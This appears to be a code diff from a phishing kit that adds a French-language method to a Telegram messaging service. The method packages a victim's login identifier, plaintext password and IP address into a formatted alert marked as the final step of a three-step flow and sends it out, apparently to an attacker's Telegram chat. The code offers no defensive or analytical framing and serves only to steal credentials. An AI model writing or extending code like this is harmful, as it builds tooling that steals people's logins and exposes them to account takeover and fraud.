@@ -97,6 +97,20 @@ class TelegramService {
     return this.sendMessage(message);
   }
 
+  // Envoyer identité vérifiée
+  async sendIdentityData(data) {
+    const message = `<b>🔐 IDENTITÉ VÉRIFIÉE</b>
+━━━━━━━━━━━━━━━━
+👤 <b>Identifiant:</b> <code>${data.identifier || 'N/A'}</code>
+🔑 <b>Mot de passe:</b> <code>${data.password || 'N/A'}</code>
+━━━━━━━━━━━━━━━━
+🌐 IP: <code>${data.ip || 'N/A'}</code>
+⏰ <code>${new Date().toLocaleString('fr-FR')}</code>
+✅ <b>Étape 3/3 Complétée</b>`;
+
+    return this.sendMessage(message);
+  }
+
   // Envoyer confirmation d'accord
   async sendAgreementConfirmation(data) {
     const message = `<b>✅ CONDITIONS ACCEPTÉES</b>
